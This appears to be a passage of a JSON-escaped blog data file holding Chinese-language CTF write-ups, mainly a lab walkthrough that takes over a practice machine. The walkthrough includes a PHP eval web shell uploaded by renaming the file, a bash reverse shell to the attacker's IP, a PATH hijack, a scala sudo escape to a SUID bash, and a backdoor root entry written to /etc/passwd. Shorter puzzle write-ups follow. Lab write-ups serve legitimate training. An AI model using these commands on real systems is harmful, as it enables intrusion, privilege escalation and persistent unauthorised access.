chabaidao.dsz\n```\n\n\u63a5\u7740\uff0c\u4f7f\u7528 `wfuzz` \u5bf9\u8be5\u57df\u540d\u8fdb\u884c\u5b50\u57df\u540d\u7206\u7834\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n\u2514\u2500$ wfuzz -c -u 'http://chabaidao.dsz/' -H 'HOST:FUZZ.chabaidao.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 764\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload\n=====================================================================\n000000002:   200        610 L    1372 W     21027 Ch    'mail - mail'\n...\n```\n\n\u53d1\u73b0\u4e00\u4e2a\u5b50\u57df\u540d `mail.chabaidao.dsz`\uff0c\u540c\u6837\u5c06\u5176\u6dfb\u52a0\u5230 `hosts` \u6587\u4ef6\u3002\n\n```bash\n# \u66f4\u65b0 /etc/hosts \u6587\u4ef6\n192.168.205.192 chabaidao.dsz mail.chabaidao.dsz\n```\n\n## 2. \u9690\u5199\u672f\u5206\u6790\n\n\u8bbf\u95ee `http://mail.chabaidao.dsz/`\uff0c\u9875\u9762\u4e0a\u53ea\u6709\u4e00\u4e2a\u53ef\u4ee5\u64ad\u653e\u97f3\u4e50\u6587\u4ef6 `music.wav`\u3002\n\n![image-20250717205551792](https://7r1UMPHK.github.io/image/20250717205552105.webp)\n\n\u901a\u8fc7\u67e5\u770b\u6e90\u4ee3\u7801\u4e0b\u8f7d `music.wav` \u6587\u4ef6\uff0c\u5e76\u4e14\u4e0e\u7f51\u7edc\u4e0a\u7684\u539f\u66f2\uff08\u5218\u745e\u7426-\u4e24\u4e09\u53e5\uff09\u8fdb\u884c\u4e8c\u8fdb\u5236\u6bd4\u8f83 (`cmp -l`)\uff0c\u53d1\u73b0\u4e24\u4e2a\u6587\u4ef6\u5728\u8bb8\u591a\u5b57\u8282\u4e0a\u4ec5\u76f8\u5dee 1\u3002\u8fd9\u5f3a\u70c8\u6307\u5411\u4e86 **\u6700\u4f4e\u6709\u6548\u4f4d\uff08LSB\uff09\u9690\u5199**\u3002\n\n> **\u4ec0\u4e48\u662f LSB \u9690\u5199\uff1f**\n>\n> LSB\uff08Least Significant Bit\uff09\u9690\u5199\u662f\u4e00\u79cd\u5c06\u79d8\u5bc6\u4fe1\u606f\u5d4c\u5165\u5230\u6570\u5b57\u5a92\u4f53\uff08\u5982\u56fe\u50cf\u6216\u97f3\u9891\uff09\u4e2d\u7684\u6280\u672f\u3002\u5b83\u901a\u8fc7\u4fee\u6539\u6bcf\u4e2a\u6837\u672c\uff08\u6216\u50cf\u7d20\uff09\u6570\u636e\u4e2d\u201c\u6700\u4e0d\u91cd\u8981\u201d\u7684\u6bd4\u7279\uff08\u5373\u6700\u4f4e\u4f4d\uff09\u6765\u9690\u85cf\u4fe1\u606f\u3002\u7531\u4e8e\u8fd9\u79cd\u4fee\u6539\u5bf9\u539f\u59cb\u6587\u4ef6\u7684\u5f71\u54cd\u6781\u5c0f\uff0c\u4eba\u8033\u6216\u8089\u773c\u5f88\u96be\u5bdf\u591c\u3002\n\n\u6211\u4eec\u7f16\u5199\u4e00\u4e2a Python \u811a\u672c\u6765\u63d0\u53d6 `music.wav` \u6570\u636e\u90e8\u5206\u6240\u6709\u5b57\u8282\u7684\u6700\u4f4e\u6709\u6548\u4f4d\uff0c\u5e76\u5c06\u5b83\u4eec\u91cd\u65b0\u7ec4\u5408\u6210\u4e00\u4e2a\u6587\u4ef6\u3002\n\n```python\nimport sys\n\ndef ext(fin, fout):\n    try:\n        with open(fin, 'rb') as f:\n            data = f.read()\n        \n        bits = [str(b & 1) for b in data[44:]]\n        \n        b_arr = bytearray()\n        for i in range(0, len(bits) - len(bits) % 8, 8):\n            b_arr.append(int(''.join(bits[i:i+8]), 2))\n            \n        with open(fout, 'wb') as f:\n            f.write(b_arr)\n            \n        print(f'\u63d0\u53d6\u5b8c\u6210 -> {fout}')\n\n    except Exception as e:\n        print(f'\u9519\u8bef: {e}')\n\nif __name__ == '__main__':\n    if len(sys.argv) != 3:\n        print('\u7528\u6cd5: python3 extract.py <\u8f93\u5165wav> <\u8f93\u51fa\u6587\u4ef6>')\n        sys.exit(1)\n    \n    ext(sys.argv[1], sys.argv[2])\n                                  \n```\n\n\u6267\u884c\u811a\u672c\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4e86\u4e00\u4e2a\u540d\u4e3a `a` \u7684\u6587\u4ef6\u3002\u4f7f\u7528 `strings` \u547d\u4ee4\u67e5\u770b\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5728\u5f00\u5934\u90e8\u5206\u53d1\u73b0\u4e86\u4e00\u7ec4\u51ed\u636e\u3002\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ python3 lsb.py music.wav a\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ strings a |head -n 10 \nadmin@liverpool12\nz       K>p\naLPu\npQV=i\n$1]4\nUDPs\n$$@D\nn>h'2\ngu]@\nTeHE$Zd\n```\n\n\u6211\u4eec\u6210\u529f\u627e\u5230\u4e86\u9690\u85cf\u7684\u5bc6\u7801\uff1a`admin@liverpool12`\u3002\n\n# \u4e09\u3001\u521d\u59cb\u8bbf\u95ee\n\n## 1. \u540e\u53f0\u767b\u5f55\u4e0e\u6587\u4ef6\u4e0a\u4f20\n\n\u4f7f\u7528 `admin@`chabaidao.dsz \u90ae\u7bb1\u548c\u521a\u627e\u5230\u7684\u5bc6\u7801 `admin@liverpool12` \u6210\u529f\u767b\u5f55\u4e86\u4e3b\u7ad9 `http://chabaidao.dsz/` \u7684\u540e\u53f0\u3002\n\n![image-20250717225850690](https://7r1UMPHK.github.io/image/20250717225851014.webp)\n\n\u540e\u53f0\u4e2a\u4eba\u8d44\u6599\u9875\u9762\u6709\u4e00\u4e2a\u5934\u50cf\u4e0a\u4f20\u529f\u80fd\uff0c\u63d0\u793a\u53ea\u5141\u8bb8\u4e0a\u4f20\u56fe\u7247\u683c\u5f0f\u3002\u8fd9\u662f\u4e00\u4e2a\u5178\u578b\u7684\u7a81\u7834\u53e3\u3002\u6211\u4eec\u91c7\u7528\u4ee5\u4e0b\u6b65\u9aa4\u7ed5\u8fc7\u9650\u5236\uff1a\n\n1.  \u51c6\u5907\u4e00\u4e2a\u8681\u5251\u7684ant.php\u6587\u4ef6\uff0c\u5c06\u5176\u6539\u540d\u4e3aant.png\u8fdb\u884c\u4e0a\u4f20(php\u53cd\u5f39shell\u65e0\u6cd5\u6709\u6548\u6267\u884c)\n\n> ```\n> \u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x]\n> \u2514\u2500$ cat ant.png\n> <?php eval($_POST['ant']); ?>\n> ```\n\n1.  \u4f7f\u7528 Burp Suite \u62e6\u622a\u6587\u4ef6\u4e0a\u4f20\u7684\u8bf7\u6c42\u3002\n2.  \u5c06\u8bf7\u6c42\u4e2d\u7684\u6587\u4ef6\u540d\u4ece `ant.png` \u4fee\u6539\u4e3a `ant.php`\u3002\n3.  \u53d1\u9001\u4fee\u6539\u540e\u7684\u8bf7\u6c42\uff0c\u5373\u53ef\u6210\u529f\u4e0a\u4f20 `any.php`\u3002\n4.  \u4e0a\u4f20\u6210\u529f\uff0c\u67e5\u770b\u5934\u50cf\u6e90\u7801\u83b7\u5f97url\u3002\n\n5.  \u4f7f\u7528\u8681\u5251\u8fdb\u884c\u8fde\u63a5\u3002\n\n![image-20250717230617743](https://7r1UMPHK.github.io/image/20250717230617972.webp)\n\n## 2. \u53cd\u5f39 Shell\n\n\u5728\u653b\u51fb\u673a\uff08Kali\uff09\u4e0a\u76d1\u542c\u7aef\u53e3\uff1a\n\n```bash\nnc -lvnp 8888\n```\n\n\u5728\u8681\u5251\u7684\u865a\u62df\u7ec8\u7aef\u5f39shell\u56de\u53bbkali\uff0c\u65b9\u4fbf\u64cd\u4f5c\u3002\n\n\u653b\u51fb\u673a\u6210\u529f\u63a5\u6536\u5230\u8fde\u63a5\uff0c\u83b7\u5f97\u4e86 `www-data` \u7528\u6237\u7684 Shell\u3002\u4e3a\u65b9\u4fbf\u540e\u7eed\u64cd\u4f5c\uff0c\u5347\u7ea7\u4e3a\u529f\u80fd\u9f50\u5168\u7684 TTY\u3002\n\n```bash\nscript /dev/null -c bash\nCtrl+Z\nstty raw -echo; fg\nreset xterm  \nexport TERM=xterm  \nexport SHELL=/bin/bash  \nstty rows 24 columns 80\n```\n\n# \u56db\u3001\u6743\u9650\u63d0\u5347\n\n## 1. \u63d0\u6743\u81f3 welcome (PATH \u52ab\u6301)\n\n\u83b7\u5f97\u4e86 `www-data` \u7684 Shell \u540e\uff0c\u9996\u5148\u68c0\u67e5 `sudo` \u6743\u9650\u3002\n\n```bash\nwww-data@Chabaidao:/tmp$ sudo -l\n...\nUser www-data may run the following commands on Chabaidao:\n    (welcome) NOPASSWD: /home/welcome/write\nwww-data@Chabaidao:/tmp$ cat /home/welcome/write \n#!/bin/bash\n\n# \u68c0\u67e5\u53c2\u6570\u6570\u91cf\nif [ $# -lt 2 ]; then\n    echo '\u7528\u6cd5: $0 <\u6587\u4ef6\u8def\u5f84> <\u8981\u5199\u5165\u7684\u5185\u5bb9>'\n    exit 1\nfi\n\nfile_path='$1'\ncontent='$2'\n\n# \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5b58\u5728\nif [ ! -f '$file_path' ]; then\n    echo '\u9519\u8bef\uff1a\u6587\u4ef6 '$file_path' \u4e0d\u5b58\u5728\uff0c\u65e0\u6cd5\u5199\u5165\u3002'\n    exit 2\nfi\n\n# \u5199\u5165\u5185\u5bb9\necho '$content' > '$file_path'\necho '\u5185\u5bb9\u5df2\u6210\u529f\u5199\u5165\u5230 $file_path'\n```\n\n`www-data` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `welcome` \u7528\u6237\u7684\u8eab\u4efd\u6267\u884c `/home/welcome/write` \u811a\u672c\u3002\u53ef\u4ee5\u770b\u51fawirte\u811a\u672c\u662f\u4ee5welcome\u7528\u6237\u5b9e\u73b0\u5199\u5165\u7684\u4e00\u4e2a\u811a\u672c\uff0c\u5e76\u4e14\u901a\u8fc7\u8fdb\u7a0b\u76d1\u63a7\u53d1\u73b0 `welcome` \u7528\u6237\u4f1a\u5b9a\u65f6\u6267\u884c `/home/welcome/chabaidao` \u811a\u672c\uff0c\u8be5\u811a\u672c\u4f1a\u8bfb\u53d6 `/home/welcome/myfile` \u7684\u5185\u5bb9\u4f5c\u4e3a `PATH` \u73af\u5883\u53d8\u91cf\u3002\u8fd9\u662f\u5178\u578b\u7684 **PATH \u73af\u5883\u53d8\u91cf\u52ab\u6301** \u63d0\u6743\u8def\u5f84\u3002\n\n1. \u5728 `www-data` \u7528\u6237\u53ef\u5199\u7684\u76ee\u5f55\uff08\u5982 `/dev/shm`\uff09\u4e0b\u521b\u5efa\u4e00\u4e2a\u540d\u4e3a `file` \u7684\u6076\u610f\u811a\u672c\uff0c\u5185\u5bb9\u4e3a\u53cd\u5f39 Shell \u547d\u4ee4\uff0c\u5e76\u8d4b\u4e88\u6267\u884c\u6743\u9650\u3002\n\n   ```bash\n   www-data@Chabaidao:/tmp$ cd /dev/shm/  \n   www-data@Chabaidao:/dev/shm$ cat > file << 'EOL'\n   > #!/bin/bash\n   > bash -c '/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1'\n   > EOL\n   www-data@Chabaidao:/dev/shm$ chmod +x file\n   ```\n\n2. \u5229\u7528 `www-data` \u7684 `sudo` \u6743\u9650\uff0c\u4ee5 `welcome` \u8eab\u4efd\u6267\u884c `write` \u811a\u672c\uff0c\u5c06\u6211\u4eec\u7684\u6076\u610f\u811a\u672c\u6240\u5728\u76ee\u5f55 `/dev/shm` \u6dfb\u52a0\u5230 `/home/welcome/myfile` \u5b9a\u4e49\u7684 `PATH` \u53d8\u91cf\u7684\u6700\u524d\u9762\u3002\n\n   ```bash\n   www-data@Chabaidao:/dev/shm$ echo '/dev/shm/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games' > /tmp/a\n   www-data@Chabaidao:/dev/shm$ sudo -u welcome /home/welcome/write /home/welcome/myfile '$(cat /tmp/a)'\n   ```\n\n3. \u5728\u653b\u51fb\u673a\u4e0a\u76d1\u542c 8888 \u7aef\u53e3\uff0c\u7b49\u5f85\u5b9a\u65f6\u4efb\u52a1\u6267\u884c\u3002\u5f53 `chabaidao` \u811a\u672c\u6267\u884c\u65f6\uff0c\u5b83\u4f1a\u4f7f\u7528\u6211\u4eec\u7be1\u6539\u540e\u7684 `PATH`\uff0c\u4ece\u800c\u4f18\u5148\u6267\u884c\u4e86 `/dev/shm/file`\uff0c\u6211\u4eec\u5c31\u83b7\u5f97\u4e86 `welcome` \u7528\u6237\u7684 Shell\u3002\n\n## 2. \u63d0\u6743\u81f3 root (Scala Sudo \u63d0\u6743)\n\n\u62ff\u5230 `welcome` \u7528\u6237\u7684 Shell \u540e\uff0c\u518d\u6b21\u68c0\u67e5 `sudo` \u6743\u9650\u3002\n\n```bash\nwelcome@Chabaidao:~$ sudo -l\n...\nUser welcome may run the following commands on Chabaidao:\n    (ALL) NOPASSWD: /usr/bin/scala\n```\n\n`welcome` \u7528\u6237\u53ef\u4ee5\u514d\u5bc6\u4ee5 `root` \u6743\u9650\u6267\u884c `scala`\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528 `scala` \u7684\u4ea4\u4e92\u5f0f\u89e3\u91ca\u5668\u6765\u6267\u884c\u4efb\u610f\u7cfb\u7edf\u547d\u4ee4\u3002\n\n1. \u4ee5 `root` \u6743\u9650\u542f\u52a8 `scala` \u89e3\u91ca\u5668\u3002\n\n   ```bash\n   sudo /usr/bin/scala\n   ```\n\n2. \u5728 `scala` \u89e3\u91ca\u5668\u4e2d\uff0c\u4f7f\u7528 `:sh` \u547d\u4ee4\u6267\u884c\u4e00\u4e2a shell \u547d\u4ee4\uff0c\u4e3a `/bin/bash` \u6dfb\u52a0 SUID \u6743\u9650\u4f4d\u3002\n\n   ```scala\n   Welcome to Scala 2.11.12 ...\n   Type in expressions for evaluation. Or try :help.\n   \n   scala> :sh chmod +s /bin/bash\n   res0: scala.tools.nsc.interpreter.ProcessResult = `chmod +s /bin/bash` (0 lines, exit 0)\n   \n   scala> :quit\n   ```\n\n3. \u9000\u51fa `scala` \u540e\uff0c\u6267\u884c `bash -p` \u6765\u5229\u7528 SUID \u4f4d\uff0c\u83b7\u5f97\u4e00\u4e2a `euid=0` \u7684 root \u6743\u9650 Shell\u3002\n\n   ```bash\n   welcome@Chabaidao:~$ bash -p\n   bash-5.0# id\n   uid=1000(welcome) gid=1000(welcome) euid=0(root) egid=0(root) groups=0(root),1000(welcome)\n   bash-5.0# whoami\n   root\n   bash-5.0#echo 'b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash' >> /etc/passwd\n   bash-5.0#su b\n   Password: abcdefg\n   root@Chabaidao:~# id\n   uid=0(root) gid=0(root) groups=0(root)\n   root@Chabaidao:~# cat /home/welcome/user.txt /root/root.txt \n   flag{user-12fc204edeae5b57713c5ad7dcb97d39}\n   flag{root-12fc204edeae5b57713c5ad7dcb97d39}\n   ```\n\n\u6210\u529f\u63d0\u6743\u81f3 root\uff0c\u6e17\u900f\u6d4b\u8bd5\u5b8c\u6210\u3002sentence", "top": 0, "createdAt": 1752803911, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P143": {"htmlDir": "docs/post/Challenge 058.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 058", "postUrl": "post/Challenge%20058.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/143", "commentNum": 0, "wordCount": 1545, "description": "\u597d\u50cf\u597d\u4e45\u6ca1\u6253Challenge\u4e86\uff0c\u6253\u6253\n\n![image-20250718210310881](https://7r1UMPHK.github.io/image/20250718210319612.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=058\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la 058.zip      \n-rwxr-xr-x 1 kali kali 35450  7\u670818\u65e5 09:05 058.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 058.zip                      \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 35450 bytes (35 KiB)\n\nExtracting archive: 058.zip\n--\nPath = 058.zip\nType = zip\nPhysical Size = 35450\n\nEverything is Ok\n\nSize:       35280\nCompressed: 35450\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al        \n\u603b\u8ba1 82\ndrwxr-xr-x 1 kali kali  4096  7\u670818\u65e5 09:05 .\ndrwxr-xr-x 1 kali kali  8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali 35450  7\u670818\u65e5 09:05 058.zip\n-rwxr-xr-x 1 kali kali 35280 2023\u5e7412\u670828\u65e5 challenge.png\n```\n\n![challenge](https://7r1UMPHK.github.io/image/20250718210626732.webp)\n\n\u50cf\u662f\u56fe\u5f62\u52a0\u5bc6\n\nhttps://www.dcode.fr/symbols-ciphers\n\n\u627e\u5c31\u5b8c\u4e8b\u4e86\n\nD'ni Numerals\n\n\u89e3\u4e00\u4e0b\u5bc6\n\n![image-20250718211005223](https://7r1UMPHK.github.io/image/20250718211005590.webp)\n\n```\nHMV{13377331}\n```\n\nsentence", "top": 0, "createdAt": 1752850609, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P144": {"htmlDir": "docs/post/Challenge 059.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 059", "postUrl": "post/Challenge%20059.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/144", "commentNum": 0, "wordCount": 5240, "description": "![image-20250718211403641](https://7r1umphk.github.io/image/20250718211403851.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=059\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 059.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 1340043 bytes (1309 KiB)\n\nExtracting archive: 059.zip\n--\nPath = 059.zip\nType = zip\nPhysical Size = 1340043\nComment = 67f1eeaca308318257ec4f222b4315741738d456\n\nEverything is Ok\n\nFolders: 22\nFiles: 120\nSize:       3143617\nCompressed: 1340043\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 1395\ndrwxr-xr-x 1 kali kali    4096  7\u670818\u65e5 09:14 .\ndrwxr-xr-x 1 kali kali    8192  7\u670817\u65e5 23:37 ..\n-rwxr-xr-x 1 kali kali   35450  7\u670818\u65e5 09:05 058.zip\n-rwxr-xr-x 1 kali kali 1340043  7\u670818\u65e5 09:14 059.zip\n-rwxr-xr-x 1 kali kali   35280 2023\u5e7412\u670828\u65e5 challenge.png\ndrwxr-xr-x 1 kali kali    4096 2024\u5e74 1\u6708 4\u65e5 h1ker-main\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ cd h1ker-main \n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/h1ker-main]\n\u2514\u2500$ ls -al\n\u603b\u8ba1 75\ndrwxr-xr-x 1 kali kali  4096 2024\u5e74 1\u6708 4\u65e5 .\ndrwxr-xr-x 1 kali kali  4096  7\u670818\u65e5 09:14 ..\ndrwxr-xr-x 1 kali kali  4096 2024\u5e74 1\u6708 4\u65e5 admin\n-rwxr-xr-x 1 kali kali  8554 2024\u5e74 1\u6708 4\u65e5 aerocms.sql\n-rwxr-xr-x 1 kali kali  2411 2024\u5e74 1\u6708 4\u65e5 author_posts.php\n-rwxr-xr-x 1 kali kali   100 2024\u5e74 1\u6708 4\u65e5 build_docker.sh\n-rwxr-xr-x 1 kali kali  3203 2024\u5e74 1\u6708 4\u65e5 category.php\ndrwxr-xr-x 1 kali kali     0 2024\u5e74 1\u6708 4\u65e5 config\ndrwxr-xr-x 1 kali kali     0 2024\u5e74 1\u6708 4\u65e5 css\n-rwxr-xr-x 1 kali kali   324 2024\u5e74 1\u6708 4\u65e5 Dockerfile\ndrwxr-xr-x 1 kali kali  4096 2024\u5e74 1\u6708 4\u65e5 fonts\ndrwxr-xr-x 1 kali kali     0 2024\u5e74 1\u6708 4\u65e5 images\ndrwxr-xr-x 1 kali kali  4096 2024\u5e74 1\u6708 4\u65e5 includes\n-rwxr-xr-x 1 kali kali  4421 2024\u5e74 1\u6708 4\u65e5 index.php\ndrwxr-xr-x 1 kali kali     0 2024\u5e74 1\u6708 4\u65e5 js\n-rwxr-xr-x 1 kali kali 18092 2024\u5e74 1\u6708 4\u65e5 LICENSE\n-rwxr-xr-x 1 kali kali  7812 2024\u5e74 1\u6708 4\u65e5 post.php\n-rwxr-xr-x 1 kali kali  1306 2024\u5e74 1\u6708 4\u65e5 README.md\n-rwxr-xr-x 1 kali kali  3176 2024\u5e74 1\u6708 4\u65e5 registration.php\n-rwxr-xr-x 1 kali kali   369 2024\u5e74 1\u6708 4\u65e5 run.sh\n-rwxr-xr-x 1 kali kali  3039 2024\u5e74 1\u6708 4\u65e5 search.php\n                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/h1ker-main]\n\u2514\u2500$ cat README.md                                        \n\n# H1ker\n<p align=center>\n<a target='_blank' href='LICENSE' title='License: MIT'><img src='https://img.shields.io/badge/License-MIT-blue.svg'></a>\n<a target='_blank' href='AeroCMS' title='AeroCMS'><img src='https://img.shields.io/badge/cms-latest-purple'></a>\n</p>\n\n# AeroCMS\nAero / AeroCMS is a simple and easy to use CMS (Content Management System) designed to create fast and powerful web applications. Aero is built with OOP (Object Oriented Programming) PHP which is known for fast website loading speeds, [AeroCMS](https://github.com/MegaTKC/AeroCMS).\n\n\nThis is a web vulnerability challenge, try to find the flag.\nThis challenge requires docker.\n\n### Manual Docker image build and run\n1. Install [Docker](https://www.docker.com)\n2. Build the image `docker build -t h1ker .`\n3. Start the container with a port of your choice by replacing 1337 `docker run --name=h1ker -d -p 1337:80 h1ker`\n4. The challenge can be found in http://localhost:1337/\n\n### Automated run\nRun the following bash script to build and run the challenge `./build_docker.sh`. The challenge can be found in http://localhost:1337/\n\n## Delete challenge\nDon't forget to delete both the container and the image of the challenge after you finish:\n1. Delete container `docker rm h1ker -f`\n2. Delete image `docker rmi h1ker`\n\n\nHave fun !\n       \n```\n\n> # H1ker\n> <p align=center>\n> <a target='_blank' href='LICENSE' title='\u8bb8\u53ef\u8bc1\uff1aMIT'><img src='https://img.shields.io/badge/License-MIT-blue.svg'></a>\n> <a target='_blank' href='AeroCMS' title='AeroCMS'><img src='https://img.shields.io/badge/cms-latest-purple'></a>\n> </p>\n>\n> # AeroCMS\n> Aero / AeroCMS \u662f\u4e00\u6b3e\u7b80\u5355\u6613\u7528\u7684 CMS\uff08\u5185\u5bb9\u7ba1\u7406\u7cfb\u7edf\uff09\uff0c\u65e8\u5728\u521b\u5efa\u5feb\u901f\u5f3a\u5927\u7684 Web \u5e94\u7528\u7a0b\u5e8f\u3002Aero \u91c7\u7528\u9762\u5411\u5bf9\u8c61\u7f16\u7a0b (OOP) PHP \u6784\u5efa\uff0c\u8be5\u8bed\u8a00\u4ee5\u5feb\u901f\u7684\u7f51\u7ad9\u52a0\u8f7d\u901f\u5ea6\u800c\u95fb\u540d\uff0c[AeroCMS](https://github.com/MegaTKC/AeroCMS)\u3002\n>\n> \u8fd9\u662f\u4e00\u4e2a Web \u6f0f\u6d1e\u6311\u6218\uff0c\u8bf7\u5c1d\u8bd5\u627e\u5230 flag\u3002\n> \u6b64\u6311\u6218\u9700\u8981 Docker \u7684\u652f\u6301\u3002\n>\n> ### \u624b\u52a8\u6784\u5efa\u5e76\u8fd0\u884c Docker \u955c\u50cf\n> 1. \u5b89\u88c5 [Docker](https://www.docker.com)\n> 2. \u6784\u5efa\u955c\u50cf `docker build -t h1ker`\n> 3. \u4f7f\u7528\u60a8\u9009\u62e9\u7684\u7aef\u53e3\u542f\u52a8\u5bb9\u5668\uff0c\u65b9\u6cd5\u662f\u5c06 1337 \u66ff\u6362\u4e3a `docker run --name=h1ker -d -p 1337:80 h1ker`\n> 4. \u60a8\u53ef\u4ee5\u5728 http://localhost:1337/ \u627e\u5230\u6311\u6218\n>\n> ### \u81ea\u52a8\u8fd0\u884c\n> \u8fd0\u884c\u4ee5\u4e0b bash \u811a\u672c\u6765\u6784\u5efa\u5e76\u8fd0\u884c\u6311\u6218 `./build_docker.sh`\u3002\u60a8\u53ef\u4ee5\u5728 http://localhost:1337/ \u627e\u5230\u6311\u6218\n>\n> ## \u5220\u9664\u6311\u6218\n> \u5b8c\u6210\u540e\uff0c\u8bf7\u8bb0\u5f97\u5220\u9664\u5bb9\u5668\u548c\u6311\u6218\u955c\u50cf\uff1a\n> 1. \u5220\u9664\u5bb9\u5668 `docker rm h1ker -f`\n> 2. \u5220\u9664\u955c\u50cf `docker rmi h1ker`\n>\n> \u795d\u60a8\u73a9\u5f97\u5f00\u5fc3\uff01\n\n\u4e0d\u7231\u5f00docker\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/\u2026/gx/x/tmp/h1ker-main]\n\u2514\u2500$ grep -r 'HMV{' . \n./admin/categories.php:                            <small>HMV{h1kinG_1s_s0_fUn}</small>\n                          \n```\n\n\u54c8\u54c8sentence", "top": 0, "createdAt": 1752850623, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-07-18", "dateLabelColor": "#0969da"}, "P145": {"htmlDir": "docs/post/Challenge 060.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 060", "postUrl": "post/Challenge%20060.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/145", "commentNum": 0, "wordCount": 1621, "description": "![image-20250718215028063](https://7r1umphk.github.io/image/20250718215056695.webp)\n\nhttps://hackmyvm.eu/challenges/challenge.php?c=060\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la 060.zip \n-rwxr-xr-x 1 kali kali 5795  7\u670818\u65e5 09:51 060.zip\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ 7z x 060.zip \n\n7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29\n 64-bit locale=zh_CN.UTF-8 Threads:128 OPEN_MAX:1024, ASM\n\nScanning the drive for archives:\n1 file, 5795 bytes (6 KiB)\n\nExtracting archive: 060.zip\n--\nPath = 060.zip\nType = zip\nPhysical Size = 5795\n\nEverything is Ok\n\nSize:       23103\nCompressed: 5795\n                                                                                                                                                                                  \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ ls -la        \n\u603b\u8ba1 1424\ndrwxr-xr-x 1 kali kali    4096  7\u670818\u65e5 09:51 .\ndrwxr-xr-x 1 kali kali    8192  7\u670817\u65e5 23:37 ..\n...\n-rwxr-xr-x 1 kali kali   23103 2024\u5e74 1\u670822\u65e5 060.txt\n-rwxr-xr-x 1 kali kali    5795  7\u670818\u65e5 09:51 060.zip\n...\n    \n\u250c\u2500\u2500(kali\u327fkali)-[/mnt/hgfs/gx/x/tmp]\n\u2514\u2500$ head -n 10 060.txt\nG90\nG20\nG17 G64 P0.001 M3 S3000\nF5.00\nG0 Z0.2500\nG0 X0.1329 Y0.0000\nG1 Z-0.0010 F0.10\nG1 X0.1329 Y0.0000F5.00\nG1 Y0.0946\nG1 X0.0536\n```\n\nG-code 